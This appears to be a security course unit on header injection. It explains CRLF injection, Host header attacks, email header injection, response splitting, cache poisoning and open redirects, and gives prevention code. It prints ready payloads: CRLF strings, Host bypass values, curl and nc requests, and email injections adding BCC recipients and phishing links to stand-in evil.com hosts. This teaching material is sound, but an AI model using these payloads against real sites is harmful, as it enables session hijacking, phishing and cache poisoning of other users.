# Unit 8: Injection Attacks — Topic 6: Header Injection

## Overview

**Header Injection** is a class of web application vulnerabilities where an attacker can inject arbitrary HTTP headers (or email headers) by inserting **carriage return and line feed characters** (`\r\n` — also known as **CRLF**) into input that is reflected in HTTP response headers, request headers, or email headers. Since HTTP and email protocols use CRLF sequences as header delimiters, injecting these characters allows the attacker to:

- **Add new HTTP response headers** (e.g., `Set-Cookie`, `Location`)
- **Split HTTP responses** (response splitting — inject an entirely new response body)
- **Poison web caches** (serve malicious content to other users)
- **Perform session fixation** (inject `Set-Cookie` headers)
- **Redirect users** (inject `Location` headers)
- **Bypass security controls** (manipulate `Host`, `X-Forwarded-For` headers)
- **Inject email headers** (add BCC recipients, modify sender)

Header injection falls under **OWASP A03:2021 – Injection** and is often a precursor to more complex attacks like **cache poisoning**, **XSS via response splitting**, and **web cache deception**.

```
HTTP Header Structure:

HTTP/1.1 200 OK\r\n                    <- Status Line
Content-Type: text/html\r\n            <- Header 1
Set-Cookie: session=abc123\r\n         <- Header 2
X-Custom: value\r\n                    <- Header 3
\r\n                                   <- Empty line (CRLF) = End of headers
<html>...</html>                       <- Response Body

Key: \r\n (CRLF) separates each header
     \r\n\r\n (double CRLF) separates headers from body
```

```
Header Injection Attack:

+----------+  Input: value%0d%0aInjected-Header: evil  +------------------+
| Attacker | -----------------------------------------> | Web Application  |
+----------+                                            +--------+---------+
      ^                                                          |
      |    HTTP/1.1 302 Found\r\n                                |
      |    Location: /page?lang=value\r\n                        |
      |    Injected-Header: evil\r\n     <-- INJECTED!           |
      |    \r\n                                                  |
      +----------------------------------------------------------+
```

---

## 1. HTTP Header Injection (CRLF Injection)

### 1.1 Understanding CRLF

**CRLF** stands for **Carriage Return** (`\r`, `%0d`, `\x0d`, ASCII 13) and **Line Feed** (`\n`, `%0a`, `\x0a`, ASCII 10). In HTTP, each header line is terminated by a CRLF sequence (`\r\n`).

| Character    | Name            | ASCII | Hex    | URL Encoding | Unicode  |
|-------------|-----------------|-------|--------|--------------|----------|
| `\r`        | Carriage Return  | 13    | `0x0D` | `%0d`        | `%u000d` |
| `\n`        | Line Feed        | 10    | `0x0A` | `%0a`        | `%u000a` |
| `\r\n`      | CRLF (combined)  | —     | —      | `%0d%0a`     | —        |

### 1.2 Vulnerable Code Patterns

**Pattern 1 — Redirect with user-controlled URL:**
```php
<?php
// User input placed directly into Location header
$lang = $_GET['lang'];
header("Location: /page?lang=" . $lang);
?>
```

**Pattern 2 — Custom header from user input:**
```python
from flask import Flask, request, make_response

@app.route('/api')
def api():
    callback = request.args.get('callback')
    response = make_response("data")
    # User input placed in response header
    response.headers['X-Callback'] = callback
    return response
```

**Pattern 3 — Cookie value from user input:**
```java
String theme = request.getParameter("theme");
// User input placed in Set-Cookie header
response.setHeader("Set-Cookie", "theme=" + theme);
```

### 1.3 Basic CRLF Injection Attack

**Normal request:**
```
GET /redirect?url=/home HTTP/1.1
Host: target.com
```

**Normal response:**
```
HTTP/1.1 302 Found
Location: /home
```

**Injected request:**
```
GET /redirect?url=/home%0d%0aSet-Cookie:%20admin=true HTTP/1.1
Host: target.com
```

**Resulting response:**
```
HTTP/1.1 302 Found
Location: /home
Set-Cookie: admin=true          <-- INJECTED HEADER!
```

```
CRLF Injection Mechanism:

Input:     /home%0d%0aSet-Cookie:%20admin=true

After URL decoding:
           /home\r\nSet-Cookie: admin=true

When placed in header:
           Location: /home\r\n
           Set-Cookie: admin=true\r\n

The \r\n terminates the Location header
and starts a new Set-Cookie header!
```

### 1.4 CRLF Encoding Variants

| Encoding            | Payload                                        | Notes                             |
|---------------------|------------------------------------------------|-----------------------------------|
| URL encoding        | `%0d%0a`                                       | Most common                       |
| Double URL encoding | `%250d%250a`                                   | Bypasses single-decode filters    |
| Unicode encoding    | `%u000d%u000a`                                 | Some parsers support Unicode      |
| UTF-8 encoding      | `%c0%8d%c0%8a`                                 | Overlong UTF-8 encoding           |
| Mixed case          | `%0D%0A`                                       | Same as lowercase                 |
| Null byte prefix    | `%00%0d%0a`                                    | May bypass string termination     |
| Tab separation      | `%0d%0a%09`                                    | Tab continuation (header folding) |
| Only LF             | `%0a`                                          | Some servers accept LF alone      |
| Only CR             | `%0d`                                          | Rarely works alone                |
| HTML entities       | `&#13;&#10;`                                   | In HTML context (not HTTP headers)|

### 1.5 CRLF Injection Payloads

```bash
# Session Fixation — Set a known session cookie
%0d%0aSet-Cookie:%20PHPSESSID=attacker_session_id

# XSS via injected header
%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(document.cookie)</script>

# Add multiple headers
%0d%0aX-Injected-Header:%20value1%0d%0aX-Another:%20value2

# Inject Content-Length to truncate response
%0d%0aContent-Length:%200%0d%0a%0d%0a

# Inject CSP header (weaken security)
%0d%0aContent-Security-Policy:%20default-src%20*

# Inject CORS header (enable cross-origin access)
%0d%0aAccess-Control-Allow-Origin:%20*

# Inject X-XSS-Protection: 0 (disable browser XSS filter)
%0d%0aX-XSS-Protection:%200
```

---

## 2. Host Header Attacks

### 2.1 Understanding Host Header Processing

The HTTP `Host` header tells the server which website is being requested (critical for virtual hosting). Many applications trust the `Host` header and use it to generate URLs, links, and redirects.

```
Virtual Hosting:

                          +----------------------------+
                          | Web Server (single IP)     |
                          |                            |
GET / HTTP/1.1            |  Host: site-a.com -----+  |
Host: site-a.com  ------->|                        |  |
                          |              +---------v+ |
                          |              | Site A   | |
                          |              +----------+ |
GET / HTTP/1.1            |                            |
Host: site-b.com  ------->|  Host: site-b.com -----+  |
                          |                        |  |
                          |              +---------v+ |
                          |              | Site B   | |
                          |              +----------+ |
                          +----------------------------+
```

### 2.2 Host Header Attack Vectors

```
+-------------------------------------------------------------------+
|              Host Header Attack Surface                            |
|                                                                    |
|  1. Password Reset Poisoning                                       |
|     - Manipulate reset link URL to point to attacker's domain     |
|                                                                    |
|  2. Web Cache Poisoning                                            |
|     - Cache response with malicious Host header                    |
|                                                                    |
|  3. SSRF                                                           |
|     - Route requests to internal hosts                             |
|                                                                    |
|  4. Access Control Bypass                                          |
|     - Access admin panels restricted by hostname                   |
|                                                                    |
|  5. SQL Injection / Business Logic Bypass                          |
|     - Host header value used in database queries                   |
+-------------------------------------------------------------------+
```

### 2.3 Password Reset Poisoning

**The most impactful Host header attack.**

```
Normal Password Reset Flow:

1. User requests password reset: POST /reset email=victim@corp.com
2. Server generates reset token
3. Server constructs reset URL using Host header:
   https://{Host}/reset?token=abc123
4. Email sent to victim: "Click here to reset: https://target.com/reset?token=abc123"

Poisoned Password Reset Flow:

1. Attacker requests reset for victim's email:
   POST /reset HTTP/1.1
   Host: attacker.com              <-- Manipulated!
   ...
   email=victim@corp.com

2. Server generates reset token
3. Server constructs URL using attacker's Host:
   https://attacker.com/reset?token=abc123

4. Email sent to VICTIM:
   "Click here to reset: https://attacker.com/reset?token=abc123"
                         ^^^^^^^^^^^^^^^^
                         Attacker's domain!

5. Victim clicks link -> Token sent to attacker.com
6. Attacker uses token to reset victim's password
```

**Vulnerable Code:**
```python
@app.route('/forgot-password', methods=['POST'])
def forgot_password():
    email = request.form['email']
    token = generate_reset_token(email)
    
    # VULNERABLE: Uses Host header to build reset URL
    reset_url = f"https://{request.host}/reset?token={token}"
    
    send_email(email, f"Reset your password: {reset_url}")
    return "Check your email!"
```

**Attack Request:**
```
POST /forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@corp.com
```

### 2.4 Host Header Bypass Techniques

When the application validates the Host header, try these bypasses:

| Technique                     | Header Value                                  | Bypass Mechanism                      |
|-------------------------------|-----------------------------------------------|---------------------------------------|
| Add port                      | `target.com:attacker.com`                     | Port parsed as separate field         |
| Subdomain                     | `target.com.attacker.com`                     | Subdomain check bypass               |
| Double Host header            | `Host: target.com\r\nHost: attacker.com`      | Server uses second Host               |
| X-Forwarded-Host              | `X-Forwarded-Host: attacker.com`              | App trusts proxy header               |
| X-Host                        | `X-Host: attacker.com`                        | Alternative host header               |
| X-Forwarded-Server            | `X-Forwarded-Server: attacker.com`            | Alternative proxy header              |
| Absolute URL                  | `GET http://attacker.com/ HTTP/1.1`           | Absolute URL overrides Host           |
| Tab/space injection           | `Host: target.com\tattacker.com`              | Whitespace parsing differences        |
| @ character                   | `Host: attacker.com@target.com`               | URL userinfo parsing                  |
| Null byte                     | `Host: target.com%00.attacker.com`            | Null byte truncation                  |
| IP address                    | `Host: 127.0.0.1`                             | Access internal vhosts                |

**Testing Host Header Attacks:**

```bash
# Basic Host header override
curl -H "Host: attacker.com" http://target.com/forgot-password

# X-Forwarded-Host (proxy bypass)
curl -H "X-Forwarded-Host: attacker.com" http://target.com/forgot-password

# X-Host
curl -H "X-Host: attacker.com" http://target.com/forgot-password

# Duplicate Host headers (may need raw HTTP)
printf "POST /forgot-password HTTP/1.1\r\n\
Host: target.com\r\n\
Host: attacker.com\r\n\
Content-Type: application/x-www-form-urlencoded\r\n\
Content-Length: 25\r\n\
\r\n\
email=victim@corp.com" | nc target.com 80
```

### 2.5 Routing-Based SSRF via Host Header

```
+----------+  Host: internal-admin.corp.local  +----------------+  Routes to internal  +------------------+
| Attacker | --------------------------------> | Reverse Proxy  | ------------------> | Internal Admin   |
| (External|                                   | (Nginx/Apache) |                     | Panel (10.0.0.5) |
|  network)|                                   +----------------+                     +------------------+
      ^                                               |
      |   Admin panel response (internal content)      |
      +------------------------------------------------+

Attack: The reverse proxy routes requests based on Host header.
If it trusts the Host header without validation, attacker 
accesses internal services.
```

---

## 3. Email Header Injection

### 3.1 How Email Header Injection Works

Web applications that send emails (contact forms, registration, password resets) often use user input in email headers. If CRLF characters are not sanitized, attackers can inject additional email headers.

**Email Header Structure:**
```
From: noreply@target.com\r\n
To: user@example.com\r\n
Subject: Contact Form Submission\r\n
CC:\r\n
BCC:\r\n
Content-Type: text/plain\r\n
\r\n
Message body here...
```

### 3.2 Vulnerable Code

**PHP — Vulnerable:**
```php
<?php
$to = "admin@target.com";
$subject = $_POST['subject'];
$message = $_POST['message'];
$from = $_POST['email'];

// VULNERABLE: User input directly in email headers
$headers = "From: " . $from;

mail($to, $subject, $message, $headers);
?>
```

**Python — Vulnerable:**
```python
import smtplib
from email.mime.text import MIMEText

def send_contact(email, subject, message):
    msg = MIMEText(message)
    msg['Subject'] = subject       # User-controlled
    msg['From'] = email            # User-controlled
    msg['To'] = 'admin@target.com'
    
    # If email contains \r\n, additional headers can be injected
    smtp = smtplib.SMTP('localhost')
    smtp.send_message(msg)
```

### 3.3 Email Header Injection Payloads

```
Scenario: Contact form with "Your Email" field

Normal input:  user@example.com
Normal header: From: user@example.com

# Inject BCC to send copy to attacker
Payload: user@example.com%0d%0aBCC: attacker@evil.com
Result:  From: user@example.com
         BCC: attacker@evil.com

# Inject CC to multiple recipients (spam relay)
Payload: user@example.com%0d%0aCC: victim1@corp.com%0d%0aCC: victim2@corp.com
Result:  From: user@example.com
         CC: victim1@corp.com
         CC: victim2@corp.com

# Inject new Subject
Payload: user@example.com%0d%0aSubject: URGENT: Reset Your Password
Result:  From: user@example.com
         Subject: URGENT: Reset Your Password

# Inject Content-Type for HTML email (phishing)
Payload: user@example.com%0d%0aContent-Type: text/html%0d%0a%0d%0a<h1>Your account has been compromised</h1><p>Click <a href="http://evil.com/phish">here</a> to secure it.</p>

# Full spam relay — inject To header
Payload: user@example.com%0d%0aTo: spam-victim@corp.com
Result:  The email is sent to the injected To address
```

### 3.4 Email Injection Attack Flow

```
Email Header Injection — Spam Relay:

+----------+   email=user@test.com%0d%0aBCC:victim@corp.com   +-------------+
| Attacker | ------------------------------------------------> | Web App     |
+----------+                                                   | (Contact    |
                                                                |  Form)      |
                                                                +------+------+
                                                                       |
                                                         Constructs email:
                                                         From: user@test.com
                                                         BCC: victim@corp.com  <-- INJECTED
                                                         To: admin@target.com
                                                         Subject: Hello
                                                                       |
                                                                       v
                                                                +------+------+
                                                                | SMTP Server |
                                                                +------+------+
                                                                       |
                                                        +-------- -----+----------+
                                                        |                          |
                                                        v                          v
                                                 +------+------+           +------+------+
                                                 | admin@      |           | victim@     |
                                                 | target.com  |           | corp.com    |
                                                 | (intended)  |           | (injected!) |
                                                 +-------------+           +-------------+
```

### 3.5 Email Injection Impact

| Attack                     | Description                                                  | Severity |
|----------------------------|--------------------------------------------------------------|----------|
| Spam relay                 | Use the target's mail server to send spam                    | High     |
| Phishing                   | Send phishing emails appearing to come from trusted domain   | High     |
| Information disclosure     | BCC copies of legitimate emails to attacker                  | High     |
| Reputation damage          | Target's domain gets blacklisted for spam                    | Medium   |
| Email spoofing             | Modify From header to impersonate anyone                     | High     |

---

## 4. HTTP Response Splitting

### 4.1 What is Response Splitting?

**HTTP Response Splitting** is an advanced form of CRLF injection where the attacker injects a complete second HTTP response into the response stream. By injecting `\r\n\r\n` (double CRLF — end of headers marker), the attacker can control the response body, and by adding additional headers, can craft an entirely new HTTP response.

```
Normal Response:
  HTTP/1.1 302 Found\r\n
  Location: /page?lang=en\r\n
  \r\n

Response Splitting Attack:
  HTTP/1.1 302 Found\r\n
  Location: /page?lang=en\r\n                     <- Original response
  \r\n
  HTTP/1.1 200 OK\r\n                             <- INJECTED second response!
  Content-Type: text/html\r\n
  Content-Length: 47\r\n
  \r\n
  <html><script>alert(document.cookie)</script>   <- Attacker's content
```

### 4.2 Response Splitting Payload Construction

```
Payload (URL-encoded):
en%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2047%0d%0a%0d%0a<html><script>alert('XSS')</script></html>

Breakdown:
  en                                    -> Legitimate value
  %0d%0a%0d%0a                          -> \r\n\r\n (end of first response)
  HTTP/1.1%20200%20OK                   -> Start of second response
  %0d%0a                                -> \r\n
  Content-Type:%20text/html             -> Header
  %0d%0a                                -> \r\n
  Content-Length:%2047                   -> Header
  %0d%0a%0d%0a                          -> \r\n\r\n (end of headers)
  <html><script>alert('XSS')</script>   -> Malicious body
```

### 4.3 Response Splitting Attack Flow

```
+----------+    GET /redirect?lang=en%0d%0a%0d%0aHTTP/1.1+200+OK...    +------------+
| Attacker | ---------------------------------------------------------> | Web Server |
+----------+                                                            +------+-----+
                                                                               |
     Sends TWO responses:                                                      |
                                                                               v
     +- Response 1 ---------------------------------------------------+
     | HTTP/1.1 302 Found                                              |
     | Location: /page?lang=en                                         |
     +----------------------------------------------------------------+
     |                                                                 |
     +- Response 2 (INJECTED) ----------------------------------------+
     | HTTP/1.1 200 OK                                                 |
     | Content-Type: text/html                                         |
     | Content-Length: 47                                               |
     |                                                                 |
     | <html><script>alert(document.cookie)</script></html>            |
     +----------------------------------------------------------------+

If a proxy/cache is between attacker and server, 
Response 2 may be cached and served to OTHER USERS!
```

### 4.4 Modern Relevance

Most modern web frameworks and servers sanitize CRLF in headers, making classic response splitting harder. However:

| Defense Status                    | Notes                                                     |
|-----------------------------------|-----------------------------------------------------------|
| **Modern frameworks** (Rails, Django, Express) | Strip `\r\n` from header values by default     |
| **Apache / Nginx**               | Recent versions reject CRLF in headers                    |
| **Older/custom applications**    | Still vulnerable if using raw header functions             |
| **Downstream proxies**           | May re-introduce vulnerability through header forwarding   |
| **HTTP/2**                       | Binary framing makes classic CRLF splitting impossible     |

---

## 5. Cache Poisoning via Header Injection

### 5.1 Web Cache Poisoning Fundamentals

**Cache poisoning** occurs when an attacker causes a web cache (CDN, reverse proxy, or browser cache) to store a malicious response and serve it to other users.

```
Normal Caching:

+--------+     GET /page     +-------+     Cache Miss     +---------+
| User A | ----------------> | Cache | ------------------> | Backend |
+--------+                   +---+---+                     +----+----+
                                 |                              |
                                 | Stores response              |
                                 | <----------------------------+
                                 |
+--------+     GET /page     +---+---+
| User B | ----------------> | Cache |  Cache Hit!
+--------+                   +---+---+  Returns stored response
                                 |
                                 v
                            Normal page served to User B ✓


Cache Poisoning:

+----------+  GET /page + Poison Header   +-------+   Poisoned request   +---------+
| Attacker | ---------------------------> | Cache | --------------------> | Backend |
+----------+                              +---+---+                      +----+----+
                                              |                               |
                                              | Stores POISONED response       |
                                              | <-----------------------------+
                                              |
+--------+     GET /page (normal)     +---+---+
| Victim | --------------------------> | Cache |  Cache Hit!
+--------+                            +---+---+  Returns POISONED response!
                                          |
                                          v
                                     MALICIOUS content served to Victim ✗
```

### 5.2 Cache Poisoning via Unkeyed Headers

The key insight: caches use a **cache key** (typically URL + Host + some headers) to identify responses. If an unkeyed header (one not part of the cache key) influences the response, it can be poisoned.

**Unkeyed Headers Commonly Used:**

| Header                  | Typical Use                              | Poisoning Potential |
|-------------------------|------------------------------------------|---------------------|
| `X-Forwarded-Host`     | Proxy-provided original host              | URL/redirect manipulation |
| `X-Forwarded-Scheme`   | Protocol (http/https)                     | Protocol downgrade  |
| `X-Forwarded-Proto`    | Protocol forwarded by proxy               | Mixed content       |
| `X-Original-URL`       | Original URL before proxy rewrite         | Path manipulation   |
| `X-Rewrite-URL`        | URL rewrite header                        | Path manipulation   |
| `X-Forwarded-Port`     | Original port                             | URL manipulation    |
| `User-Agent`           | Client browser info                       | Conditional responses |
| `Cookie` (specific)    | Tracking/language cookies                 | Content variation   |

### 5.3 Cache Poisoning Attack Examples

**Example 1: X-Forwarded-Host Poisoning:**

```
# Attacker sends request with malicious X-Forwarded-Host
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# If application uses X-Forwarded-Host for generating URLs:
# Response includes: <script src="https://attacker.com/resources/app.js"></script>

# Cache stores this response for URL: /page (X-Forwarded-Host is NOT in cache key)
# All subsequent requests to /page get the poisoned response with attacker's JS!
```

**Example 2: Cache Poisoning via CRLF Injection:**

```
GET /redirect?url=/home%0d%0aX-Injected:%20evil HTTP/1.1
Host: target.com

# Response:
HTTP/1.1 302 Found
Location: /home
X-Injected: evil          <-- Injected via CRLF

# If the cache stores this and serves it for /redirect?url=/home
# Other users get the injected header
```

### 5.4 Cache Poisoning Detection Methodology

```
+----------------------------------------------+
| 1. Identify cache behavior                    |
|    Check for: Age, X-Cache, Cache-Control,    |
|    Via, CF-Cache-Status headers               |
+---------------------+------------------------+
                      |
                      v
+---------------------+------------------------+
| 2. Identify unkeyed inputs                    |
|    Test headers: X-Forwarded-Host,            |
|    X-Original-URL, X-Forwarded-Scheme, etc.   |
|    Tool: Param Miner (Burp extension)         |
+---------------------+------------------------+
                      |
                      v
+---------------------+------------------------+
| 3. Test if unkeyed input affects response     |
|    Does X-Forwarded-Host change URLs in HTML? |
|    Does the response differ with the header?  |
+---------------------+------------------------+
                      |
                      v
+---------------------+------------------------+
| 4. Craft poisoned response                    |
|    Inject JS/redirect via unkeyed header      |
|    Wait for cache to store the response       |
+---------------------+------------------------+
                      |
                      v
+---------------------+------------------------+
| 5. Verify poisoning                           |
|    Remove the attack header and request again  |
|    If malicious content is still served,       |
|    the cache is poisoned!                      |
+----------------------------------------------+
```

### 5.5 Tools for Cache Poisoning

```bash
# Param Miner (Burp Suite Extension)
# Automatically discovers unkeyed headers and parameters
# Install: BApp Store -> Param Miner

# Web-Cache-Vulnerability-Scanner
# https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner
wcvs -u https://target.com

# Manual testing with curl
# Step 1: Send request with cache-buster parameter
curl -v -H "X-Forwarded-Host: attacker.com" \
  "https://target.com/page?cb=12345"

# Step 2: Check if response reflects attacker.com
# Step 3: Remove X-Forwarded-Host and request same URL
curl -v "https://target.com/page?cb=12345"
# If attacker.com still appears -> Cache is poisoned!
```

---

## 6. Open Redirect via Headers

### 6.1 Host-Based Open Redirects

When applications construct redirect URLs using the `Host` header, an attacker can manipulate the redirect target:

```
Vulnerable Code:
  redirect_url = "https://" + request.host + "/dashboard"
  return redirect(redirect_url)

Attack:
  GET /login-success HTTP/1.1
  Host: attacker.com

  Response:
  HTTP/1.1 302 Found
  Location: https://attacker.com/dashboard    <-- Redirects to attacker!
```

### 6.2 X-Forwarded-Host Open Redirect

```
GET /login-success HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# If application trusts X-Forwarded-Host for URL construction:
Response:
HTTP/1.1 302 Found
Location: https://attacker.com/dashboard
```

### 6.3 CRLF-Based Open Redirect

```
# Inject a Location header via CRLF
GET /page?param=value%0d%0aLocation:%20https://attacker.com/phish HTTP/1.1
Host: target.com

# Response:
HTTP/1.1 200 OK
X-Custom: value
Location: https://attacker.com/phish    <-- Injected redirect!
```

### 6.4 Open Redirect Exploitation Chain

```
+------------------------------------------------------------------+
|  Open Redirect Attack Chain:                                      |
|                                                                    |
|  1. Attacker crafts URL:                                          |
|     https://target.com/redirect?url=https://attacker.com/phish    |
|                                                                    |
|  2. Attacker sends URL to victim (via email, chat, etc.)          |
|                                                                    |
|  3. Victim clicks link — sees trusted target.com domain           |
|                                                                    |
|  4. target.com redirects to attacker.com/phish                    |
|                                                                    |
|  5. attacker.com shows fake login page for target.com             |
|                                                                    |
|  6. Victim enters credentials on fake page                        |
|                                                                    |
|  7. Attacker captures credentials                                 |
|                                                                    |
|  Additional uses:                                                  |
|  - OAuth token theft (redirect_uri manipulation)                   |
|  - SSO bypass                                                      |
|  - SSRF chain (redirect to internal services)                     |
+------------------------------------------------------------------+
```

### 6.5 Open Redirect via Header Summary

| Technique                    | Header Used              | Example                                           |
|------------------------------|--------------------------|---------------------------------------------------|
| Host header manipulation     | `Host`                   | `Host: attacker.com`                              |
| X-Forwarded-Host             | `X-Forwarded-Host`       | `X-Forwarded-Host: attacker.com`                  |
| CRLF Location injection     | Any vulnerable param      | `%0d%0aLocation: https://evil.com`                |
| X-Original-URL               | `X-Original-URL`         | `X-Original-URL: https://evil.com`                |
| Referer-based redirect       | `Referer`                | `Referer: https://attacker.com`                   |

---

## 7. Prevention Techniques

### 7.1 CRLF Injection Prevention

```
+-----------------------------------------------------------------------+
|                    CRLF Injection Prevention                           |
|                                                                         |
|  +-------------------------------------------------------------------+ |
|  | Rule 1: STRIP OR REJECT CRLF CHARACTERS IN INPUT                  | |
|  |   Remove \r (0x0D) and \n (0x0A) from any user input             | |
|  |   that will be placed in HTTP headers                              | |
|  +-------------------------------------------------------------------+ |
|                                                                         |
|  +-------------------------------------------------------------------+ |
|  | Rule 2: USE FRAMEWORK-PROVIDED HEADER SETTING FUNCTIONS           | |
|  |   Modern frameworks sanitize headers automatically:                | |
|  |   - Flask: response.headers['X'] = value                          | |
|  |   - Django: HttpResponse['X'] = value                             | |
|  |   - Express: res.set('X', value)                                  | |
|  |   - Rails: response.headers['X'] = value                          | |
|  +-------------------------------------------------------------------+ |
|                                                                         |
|  +-------------------------------------------------------------------+ |
|  | Rule 3: URL-ENCODE HEADER VALUES                                  | |
|  |   Encode special characters before placing in headers              | |
|  +-------------------------------------------------------------------+ |
|                                                                         |
|  +-------------------------------------------------------------------+ |
|  | Rule 4: USE ALLOWLISTS FOR REDIRECT DESTINATIONS                  | |
|  |   Only redirect to pre-approved URLs/domains                       | |
|  +-------------------------------------------------------------------+ |
+-----------------------------------------------------------------------+
```

### 7.2 Secure Code Examples

**PHP — CRLF Prevention:**
```php
<?php
// Remove CRLF characters from header values
function sanitize_header($value) {
    return str_replace(["\r", "\n", "%0d", "%0a", "%0D", "%0A"], '', $value);
}

$lang = sanitize_header($_GET['lang']);
header("Location: /page?lang=" . urlencode($lang));

// Or use built-in URL encoding
$url = $_GET['redirect'];
if (parse_url($url, PHP_URL_HOST) === 'target.com') {
    header("Location: " . $url);
} else {
    header("Location: /");
}
?>
```

**Python/Flask — CRLF Prevention:**
```python
from flask import redirect, request
from urllib.parse import urlparse

@app.route('/redirect')
def safe_redirect():
    url = request.args.get('url', '/')
    
    # Validate redirect URL — only allow same-domain redirects
    parsed = urlparse(url)
    if parsed.netloc and parsed.netloc != request.host:
        url = '/'
    
    # Flask's redirect() function sanitizes headers
    return redirect(url)

# For custom headers — strip CRLF
@app.route('/api')
def api():
    callback = request.args.get('callback', '')
    # Remove any CRLF characters
    callback = callback.replace('\r', '').replace('\n', '')
    
    response = make_response("data")
    response.headers['X-Callback'] = callback
    return response
```

**Node.js/Express — CRLF Prevention:**
```javascript
app.get('/redirect', (req, res) => {
    let url = req.query.url || '/';
    
    // Validate redirect target
    const parsed = new URL(url, `https://${req.headers.host}`);
    if (parsed.hostname !== req.headers.host) {
        url = '/';
    }
    
    // Express 4.x+ sanitizes CRLF in res.set() and res.redirect()
    res.redirect(url);
});

// For custom headers
app.get('/api', (req, res) => {
    let value = req.query.value || '';
    // Strip CRLF
    value = value.replace(/[\r\n]/g, '');
    res.set('X-Custom', value);
    res.send('data');
});
```

### 7.3 Host Header Attack Prevention

```python
# Django — ALLOWED_HOSTS setting
# settings.py
ALLOWED_HOSTS = ['target.com', 'www.target.com']
# Django rejects requests with any other Host header

# Flask — Validate Host header
@app.before_request
def validate_host():
    allowed_hosts = ['target.com', 'www.target.com']
    if request.host not in allowed_hosts:
        abort(400)

# Use SERVER_NAME instead of Host header for URL construction
app.config['SERVER_NAME'] = 'target.com'
```

```
# Nginx — Reject unknown Host headers
server {
    listen 80 default_server;
    server_name _;
    return 444;    # Close connection for unknown hosts
}

server {
    listen 80;
    server_name target.com www.target.com;
    # ... normal configuration ...
}
```

```
# Apache — Reject unknown hosts
<VirtualHost *:80>
    ServerName default
    <Location />
        Require all denied
    </Location>
</VirtualHost>

<VirtualHost *:80>
    ServerName target.com
    ServerAlias www.target.com
    # ... normal configuration ...
</VirtualHost>
```

### 7.4 Email Header Injection Prevention

```php
<?php
// PHP — Validate email and strip CRLF
function sanitize_email_header($value) {
    // Remove CRLF
    $value = str_replace(["\r", "\n", "%0d", "%0a"], '', $value);
    return $value;
}

$from = sanitize_email_header($_POST['email']);

// Validate email format
if (!filter_var($from, FILTER_VALIDATE_EMAIL)) {
    die("Invalid email address");
}

// Use a library instead of mail() — PHPMailer, SwiftMailer
use PHPMailer\PHPMailer\PHPMailer;
$mail = new PHPMailer(true);
$mail->setFrom('noreply@target.com');
$mail->addReplyTo($from);  // PHPMailer sanitizes headers
$mail->addAddress('admin@target.com');
$mail->Subject = sanitize_email_header($_POST['subject']);
$mail->Body = $_POST['message'];
$mail->send();
?>
```

```python
# Python — Use email libraries that handle header injection
from email.headerregistry import Address
from email.message import EmailMessage

msg = EmailMessage()
msg['Subject'] = subject.replace('\r', '').replace('\n', '')
msg['From'] = Address(display_name='', addr_spec='noreply@target.com')
msg['To'] = Address(display_name='', addr_spec='admin@target.com')
msg.set_content(message)

# email.message.EmailMessage sanitizes headers in Python 3.6+
```

### 7.5 Prevention Summary Table

| Attack Type              | Primary Prevention                                    | Secondary Prevention                         |
|--------------------------|-------------------------------------------------------|----------------------------------------------|
| CRLF Injection           | Strip `\r\n` from all header values                  | Use framework header-setting functions        |
| Host Header Attacks      | Allowlist valid hostnames; don't trust Host header    | Use server configuration (ALLOWED_HOSTS)      |
| Email Header Injection   | Strip CRLF from email fields; use mail libraries     | Validate email format; rate limiting          |
| Response Splitting       | Modern frameworks prevent this by default             | Upgrade servers; use HTTP/2                   |
| Cache Poisoning          | Don't use unkeyed headers in response generation      | Vary header; cache key normalization          |
| Open Redirect            | Allowlist redirect destinations; relative URLs only   | Validate URL domain before redirect           |

### 7.6 Defense-in-Depth Architecture

```
+-----------------------------------------------------------------------+
|                    Header Injection Defense Layers                      |
|                                                                         |
|  Layer 1: INPUT SANITIZATION                                            |
|    Strip \r\n from ALL user input used in headers                       |
|    Validate email format, URL format, hostname format                   |
|                                                                         |
|  Layer 2: FRAMEWORK PROTECTIONS                                         |
|    Use built-in header-setting functions                                |
|    Enable ALLOWED_HOSTS / hostname validation                           |
|                                                                         |
|  Layer 3: SERVER CONFIGURATION                                          |
|    Configure virtual hosts to reject unknown Host headers               |
|    Disable unused proxy headers (X-Forwarded-Host)                      |
|                                                                         |
|  Layer 4: CACHING CONFIGURATION                                        |
|    Include relevant headers in cache key (Vary header)                  |
|    Don't cache responses that depend on user-specific headers           |
|                                                                         |
|  Layer 5: WAF + MONITORING                                              |
|    Block requests containing %0d%0a in parameters                       |
|    Alert on unusual Host header values                                  |
|    Monitor cache hit rates for anomalies                                |
|                                                                         |
|  Layer 6: HTTP/2 ADOPTION                                               |
|    Binary framing eliminates CRLF-based response splitting              |
+-----------------------------------------------------------------------+
```

---

## Summary Table

| Concept                     | Key Points                                                                                      |
|-----------------------------|-------------------------------------------------------------------------------------------------|
| **CRLF Injection**         | Injecting `\r\n` (`%0d%0a`) into HTTP headers to add new headers or split responses              |
| **Host Header Attacks**     | Manipulating the Host header for password reset poisoning, SSRF, cache poisoning                 |
| **Email Header Injection**  | Injecting CRLF into email headers to add BCC/CC recipients, enable spam relay, phishing         |
| **Response Splitting**      | Injecting a complete second HTTP response via CRLF in headers (largely mitigated by modern servers) |
| **Cache Poisoning**         | Using unkeyed headers (X-Forwarded-Host, etc.) to poison cached responses served to other users  |
| **Open Redirect**           | Manipulating Host/X-Forwarded-Host headers to redirect users to attacker-controlled domains      |
| **Prevention**              | Strip CRLF from inputs, validate Host header, use framework functions, allowlist redirects       |

---

## Revision Questions

1. **Explain what CRLF injection is and why the characters `\r\n` are significant in the HTTP protocol. Demonstrate how an attacker could use CRLF injection in a redirect URL parameter to inject a `Set-Cookie` header, and explain the security impact.**

2. **Describe the password reset poisoning attack via Host header manipulation. Walk through the complete attack flow from the attacker's initial request to credential compromise, including what makes the vulnerable application susceptible and how the email reaches the victim with the attacker's domain.**

3. **A web application uses a CDN with caching enabled. The application reflects the `X-Forwarded-Host` header value in generated HTML links, but this header is not included in the cache key. Explain how an attacker would exploit this for cache poisoning, and describe the methodology for detecting and confirming the vulnerability.**

4. **Compare HTTP header injection (CRLF injection) with HTTP response splitting. How does response splitting build upon basic CRLF injection, and why is this attack less feasible on modern web servers? Under what circumstances might it still be exploitable?**

